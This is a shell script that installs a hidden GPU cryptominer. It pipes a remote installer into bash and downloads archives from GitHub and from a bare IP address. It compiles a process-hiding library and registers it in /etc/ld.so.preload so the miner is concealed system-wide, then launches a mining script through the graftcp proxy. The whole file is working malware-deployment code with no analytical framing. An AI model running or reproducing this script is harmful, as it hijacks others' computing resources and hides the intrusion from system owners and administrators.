#!/bin/sh
wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/graf_installer_for_oliphant_ws5.sh | bash
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicMin.zip
unzip magicMin.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
wget http://13.244.135.172/miniZ_v1.8y3_linux-x64.tar.gz
tar -xvzf miniZ_v1.8y3_linux-x64.tar.gz
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/min_flex.sh
chmod +x min_flex.sh
graftcp ./min_flex.sh
